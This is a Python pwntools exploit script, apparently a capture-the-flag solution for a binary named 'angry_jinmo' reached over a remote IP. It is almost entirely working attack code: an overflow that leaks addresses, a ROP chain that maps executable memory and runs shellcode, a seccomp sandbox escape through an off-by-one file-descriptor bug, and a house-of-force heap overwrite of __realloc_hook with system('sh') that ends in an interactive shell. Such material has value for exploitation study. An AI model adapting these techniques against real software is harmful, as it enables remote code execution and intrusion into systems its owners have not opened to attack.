#!/usr/bin/env python

from pwn import *   # pip install pwntools
import os
context.arch = 'amd64'

salt = "what_is_right_what_is_wrong_who_are_you_what_s_your_name_say_my_name_say_my_name"

if "remote" not in sys.argv:
    local = True
    os.system("rm -rf /home/angry_jinmo/tokens/*/")
    os.system("mkdir -p /home/angry_jinmo/tokens/bd9e8340b617a3651f2e52842888f962/")
    os.system("echo %s > /home/angry_jinmo/salt.txt" % salt)

    @atexit.register
    def handler():
        os.system("rm -rf /home/angry_jinmo/")
        log.info("Environ cleaned")

    #r = remote("localhost", 4000)
    #r = process(["./angry_jinmo", "child"])
    r = process(["./angry_jinmo"])
    libc = ELF("../../libc.so.6")
    off2libc = 0xb5a010

else:
    r = remote("100.100.100.205", 9797)
    libc = ELF("./libc.so.6")
    off2libc = 0xacd010

# pause()

def CreateBox(vol, name):
    r.send(p32(0x22978A14))
    payload = "VOL\0" + p32(len(vol)) + vol
    payload += "NAME" + p32(len(name)) + name
    r.send(p32(len(payload)))
    r.send(payload)

def EnterBox(vol, name):
    r.send(p32(0x7DAA7189))
    payload = "VOL\0" + p32(len(vol)) + vol
    payload += "NAME" + p32(len(name)) + name
    r.send(p32(len(payload)))
    r.send(payload)

def ReadFile(name):
    r.send(p32(0x225D983B))
    payload = "NAME" + p32(len(name)) + name
    r.send(p32(len(payload)))
    r.send(payload)

    size = u32(r.recv(4))
    if size >= 0x80000000:
        log.failure("Read failed")
    else:
        log.success("Read %s = %d bytes" % (name, size))
        sleep(0.1)
        print r.recv(size)

def WriteFile(name, data):
    r.send(p32(0x9D1CF651))
    payload =  "NAME" + p32(len(name)) + name
    payload += "DATA" + p32(len(data)) + data
    r.send(p32(len(payload)))
    r.send(payload)

def ListFile(toke):
    r.send(p32(0x7AB459A6))
    payload = "TOKE" + p32(len(toke)) + toke
    r.send(p32(len(payload)))
    r.send(payload)

if "nopoc" not in sys.argv:
    prefix = r.recv(8)
    log.info("prefix = " + enhex(prefix))

    while True:
        poc = prefix + randoms(12)
        if sha1sum(poc)[:2] == "\x00\x00":
            log.success("poc = " + enhex(poc))
            r.send(poc)
            break

r.recvuntil("Q. Are you human?\n")
r.sendline("0p3nth3d0000r_s3s4m3_Im_hum4n!")
r.recvuntil("Ok, you're now approved as human :D\n")

"""
# leak salt
r.send(p32(7))
CreateBox("123", "123")
EnterBox("444", "123")
EnterBox("444", "123")
EnterBox("444", "123")
EnterBox("444", "123")
EnterBox("444", "123")
ReadFile("salt.txt")
"""

vol = randoms(7)
name = "Lays"

toke = md5sumhex("%s:%s:%s" % ( vol, name, salt ))
#log.info("toke = " + toke)

# create folder and write a file with large name to leak data in ListFile()
leak_cnt = 17 # how many qword to leak from ret addr
payload = "A" * 52 + p32(0x68 + 8 * leak_cnt) # overwrite len to leak
payload_md5 = md5sumhex(payload)

r.send(p32(3))
CreateBox(vol, name)
EnterBox(vol, name)
WriteFile(payload, "payload1")

r.send(p32(4))
EnterBox("1", "blackhacker's PC") # cd ..
EnterBox("1", "blackhacker's PC") # cd ..
EnterBox("098c8122", "blackhacker's PC") # fetch admin token
ListFile(toke) # trigger bof to leak

leak = r.recvuntil("COPY", drop=True)
r.recvuntil(payload_md5)

base = u64(leak[-8*leak_cnt:-8*leak_cnt+8]) - 0x2f01
log.info("base = " + hex(base))

if local:
    libc_base = u64(leak[-8:]) - 0x20830 # __libc_start_main
    pop_rdx = libc_base + 0x1b92
    setcontext = libc_base + 0x47b9f
else:
    libc_base = u64(leak[-8:]) - 0x21ec5
    pop_rdx = libc_base + 0x1b8e
    setcontext = libc_base + 0x4723f

log.info("libc_base = " + hex(libc_base))

read = base + 0x1110
mmap = base + 0x12d0
pop_rdi = base + 0x5f93
pop_rsi_r15 = base + 0x5f91
buf = base + 0x2081B0

# create new box for bof payload
r.send(p32(3))
EnterBox("a", "a") # cd ..
EnterBox("a", "a") # cd ..
EnterBox("a", "a") # cd ..
r.recvn(12)

vol = randoms(7)
name = "Lays"
toke2 = md5sumhex("%s:%s:%s" % ( vol, name, salt ))
# log.info("toke2 = " + toke2)

payload = "P" * 52 + p32(0) + p32(0) + p32(9) + p32(0) * 6 + p64(base) + p64(0)

## read(0, buf, 100) for context
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(buf) + p64(0)
payload += p64(pop_rdx) + p64(0x200)
payload += p64(read)

# mmap(0x10000, 0x10000, 0x77, 0x34, 0, 0)
payload += p64(pop_rdi) + p64(buf - 0x28)
payload += p64(setcontext)
payload += p64(mmap)

# read(0, 0x10000, 0x1000)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rdx) + p64(0x1000)
payload += p64(read)

# ret 2 shellcode
payload += p64(0x10000)

assert(len(payload) <= 256)

r.send(p32(3))
CreateBox(vol, name) # get into our new box
EnterBox(vol, name)
WriteFile(payload, "payload2")

r.send(p32(4))
EnterBox("a", "a") # cd ..
EnterBox("a", "a") # cd ..
EnterBox("098c8122", "blackhacker's PC") # fetch admin token
ListFile(toke2) # trigger bof
r.recvn(8)


# send context

# setcontext
#   47b9f:       48 8b 77 70             mov    rsi,QWORD PTR [rdi+0x70]
#   47ba3:       48 8b 97 88 00 00 00    mov    rdx,QWORD PTR [rdi+0x88]
#   47baa:       48 8b 8f 98 00 00 00    mov    rcx,QWORD PTR [rdi+0x98]
#   47bb1:       4c 8b 47 28             mov    r8,QWORD PTR [rdi+0x28]
#   47bb5:       4c 8b 4f 30             mov    r9,QWORD PTR [rdi+0x30]
#   47bb9:       48 8b 7f 68             mov    rdi,QWORD PTR [rdi+0x68]
#   47bbd:       31 c0                   xor    eax,eax
#   47bbf:       c3                      ret
 
rdi = 0x10000   # adr
rsi = 0x10000   # size
rdx = 0x77      # rwx
rcx = 34
r8 = 0
r9 = 0

r.sendline(flat(
    p64(r8) +   # 0x28 
    p64(r9) +   # 0x30
    (0x68-0x30-8) * "A" + 
    p64(rdi) +  # 0x68
    p64(rsi) +  # 0x70
    (0x88-0x70-8) * "B" + 
    p64(rdx) +  # 0x88
    (0x98-0x88-8) * "C" + 
    p64(rcx)    # 0x98
))

"""
 0000: 0x20 0x00 0x00 0x00000004   ld  $data[4]
 0001: 0x15 0x00 0x21 0xc000003e   jeq 3221225534 true:0002 false:0035
 0002: 0x20 0x00 0x00 0x00000000   ld  $data[0]
 0003: 0x35 0x1f 0x00 0x40000000   jge 1073741824 true:0035 false:0004
 0004: 0x15 0x1d 0x00 0x00000000   jeq 0    true:0034 false:0005
 0005: 0x15 0x1c 0x00 0x00000001   jeq 1    true:0034 false:0006
 0006: 0x15 0x1b 0x00 0x00000002   jeq 2    true:0034 false:0007
 0007: 0x15 0x1a 0x00 0x00000003   jeq 3    true:0034 false:0008
 0008: 0x15 0x19 0x00 0x00000005   jeq 5    true:0034 false:0009
 0009: 0x15 0x18 0x00 0x00000008   jeq 8    true:0034 false:0010
 0010: 0x15 0x17 0x00 0x00000009   jeq 9    true:0034 false:0011
 0011: 0x15 0x16 0x00 0x0000000b   jeq 11   true:0034 false:0012
 0012: 0x15 0x15 0x00 0x0000000c   jeq 12   true:0034 false:0013
 0013: 0x15 0x14 0x00 0x0000000f   jeq 15   true:0034 false:0014
 0014: 0x15 0x13 0x00 0x00000015   jeq 21   true:0034 false:0015
 0015: 0x15 0x12 0x00 0x00000019   jeq 25   true:0034 false:0016
 0016: 0x15 0x11 0x00 0x00000021   jeq 33   true:0034 false:0017
 0017: 0x15 0x10 0x00 0x00000023   jeq 35   true:0034 false:0018
 0018: 0x15 0x0f 0x00 0x00000050   jeq 80   true:0034 false:0019
 0019: 0x15 0x0e 0x00 0x00000053   jeq 83   true:0034 false:0020
 0020: 0x15 0x0d 0x00 0x000000ca   jeq 202  true:0034 false:0021
 0021: 0x15 0x0c 0x00 0x000000e7   jeq 231  true:0034 false:0022
 0022: 0x15 0x0b 0x00 0x0000018c   jeq 396  true:0034 false:0023
 0023: 0x15 0x0a 0x00 0x0000018d   jeq 397  true:0034 false:0024
 0024: 0x15 0x09 0x00 0x0000018e   jeq 398  true:0034 false:0025
 0025: 0x15 0x08 0x00 0x0000018f   jeq 399  true:0034 false:0026
 0026: 0x15 0x00 0x08 0x0000000a   jeq 10   true:0027 false:0035
 0027: 0x20 0x00 0x00 0x00000024   ld  $data[36]
 0028: 0x54 0x00 0x00 0x00000000   and 0x00000000
 0029: 0x15 0x00 0x05 0x00000000   jeq 0    true:0030 false:0035
 0030: 0x20 0x00 0x00 0x00000020   ld  $data[32]
 0031: 0x54 0x00 0x00 0x00000007   and 0x00000007
 0032: 0x15 0x01 0x00 0x00000003   jeq 3    true:0034 false:0033
 0033: 0x15 0x00 0x01 0x00000001   jeq 1    true:0034 false:0035
 0034: 0x06 0x00 0x00 0x7fff0000   ret ALLOW
 0035: 0x06 0x00 0x00 0x00000000   ret KILL
"""

#    regs.rbx = rand32[0];
#    regs.rcx = rand32[1];
#    regs.rdx = rand32[2];
#    regs.r8 = rand32[3];
#    (rand32[0] ^ (rand32[2] + rand32[1] - rand32[3])) 

# stage1, active medium level sandbox
sc = asm("""

    mov rdi, {medium}
    mov rax, 396
    syscall

    /* pass 397 check */
    mov rdi, rdx
    add rdi, rcx
    sub rdi, r8
    xor rdi, rbx

    mov rax, 397
    jmp next
    .byte 0xCA, 0xFE, 0x6D, 0x71, 0xE1, 0xEA, 0x2A, 0x91, 0x20, 0x23, 0x74, 0xBC, 0x14, 0x2C, 0x93, 0x8B
 
next:
    syscall
"""

# stage2, OOB
"""    
    /* use off by 1 to set fd_count to 17 */
    mov rcx, 15
open:
    push rcx
    mov rax, SYS_open
    syscall
    pop rcx
    loop open

    /* fd[0] = 1 */
    mov rax, SYS_dup2
    xor rdi, rdi
    syscall

    /* close(16) to make fd_count = 0 */
    mov rax, SYS_close
    mov rdi, 16
    syscall

    /* close(0) to make fd_count = -1 */
    mov rax, SYS_close
    xor rdi, rdi
    syscall
"""
# stage3, leak parent addresses
"""
    /* leak parent base */
    mov rax, SYS_dup2
    mov rdi, 0x207008
    sub rdi, 0x2081c0
    sar rdi, 3
    syscall
    sub rbx, 0x207008

    /* save parent base to memory */
    mov rdi, {base}
    mov [rdi+0x208040], rbx

    /* log */
    push rbx
    call Log

    /* leak heap */
    mov rdi, 0x208250 /* write buf */
    call Leak
    sub rbx, 0x10

    /* save heap to memory */
    mov rdi, {base}
    mov [rdi+0x208050], rbx

    /* set write buf to 0 to fix realloc */
    call CleanBuf

    /* log */
    push rbx
    call Log

    /* trigger mmap to leak parent libc */
    mov rax, SYS_write
    mov rdi, 2
    xor rsi, rsi
    mov rdx, 0x100000
    syscall
    
    /* leak write buf and get libc base */ 
    mov rdi, 0x208250   /* write buf */
    call Leak
    sub rbx, {off2libc}

    /* save to memory */
    mov rdi, {base}
    mov [rdi+0x208060], rbx

    /* set write buf to 0 to fix realloc */
    call CleanBuf

    /* log */
    push rbx
    call Log

    /* leak xor seed */
    mov rdi, 0x2081a0
    call Leak
    inc rbx

    /* save to memory */
    mov rdi, {base}
    mov [rdi+0x208070], rbx

    /* log */
    push rbx
    call Log
"""
# stage4, House of force in parent process
"""
    /* overwrite size of top chunk to 0 */
    call GetHeap
    mov rdi, rax
    add rdi, 0x48
    call GetBase
    sub rdi, rax
    call WriteNULL

    /* dec size of top chunk */
    call GetHeap
    mov rdi, rax
    add rdi, 0x48
    call GetBase
    sub rdi, rax
    call Dec

    /* malloc(target-top-16) */
    call GetLibc
    add rax, 0x3c3b08 /* realloc hook */
    sub rax, 0x10
    mov rdi, rax
    call GetHeap
    add rax, 0x40     /* top */
    sub rdi, rax
    sub rdi, 16
    call malloc

    /* trigger malloc and write system to __realloc_hook */
    call CleanBuf

    call GetLibc
    add rax, {system}   /* system */ 
    push rax
    push 0x00006873     /* sh */
    
    call GetSeed
    xor [rsp], rax      /* put sh in write buf */
    xor [rsp+8], rax
    
    mov rax, SYS_write 
    mov rsi, rsp
    mov rdx, 0x100
    syscall

    /* trigger realloc('sh') */
    mov rax, SYS_write
    syscall
"""

"""
inf:
    jmp inf

Log:
    mov rax, SYS_write
    mov rdi, 1
    lea rsi, [rsp+8]
    mov rdx, 8
    syscall
    ret
Leak:
    sub rdi, 0x2081c0
    sar rdi, 3
    mov rax, SYS_dup2
    syscall
    ret
WriteNULL:
    sub rdi, 0x2081c0
    sar rdi, 3
    mov rsi, 1
    mov rax, SYS_close
    syscall
    ret
Dec:
    sub rdi, 0x2081c0
    sar rdi, 3
    xor rsi, rsi
    mov rax, SYS_close
    syscall
    ret
CleanBuf:
    mov rdi, 0x208250
    call WriteNULL
    ret
malloc:
    mov rdx, rdi
    call CleanBuf
    mov rax, SYS_write
    syscall
    ret
GetBase:
    mov rax, {base}
    mov rax, [rax+0x208040]
    ret
GetHeap:
    mov rax, {base}
    mov rax, [rax+0x208050]
    ret
GetLibc:
    mov rax, {base}
    mov rax, [rax+0x208060]
    ret
GetSeed:
    mov rax, {base}
    mov rax, [rax+0x208070]
    ret
""".format(
    medium=hex(base+0x5FD2),
    base=hex(base),
    off2libc=hex(off2libc),
    system=hex(libc.symbols["system"]),
))

r.sendline(sc)
r.recv()

# for debugging
parent_base = u64(r.recv(8))
parent_heap = u64(r.recv(8))
parent_libc = u64(r.recv(8))
xor_seed = u64(r.recv(8))
log.info("parent_base = " + hex(parent_base))
log.info("parent_heap = " + hex(parent_heap))
log.info("parent_libc = " + hex(parent_libc))
log.info("xor seed = " + hex(xor_seed))

r.interactive()
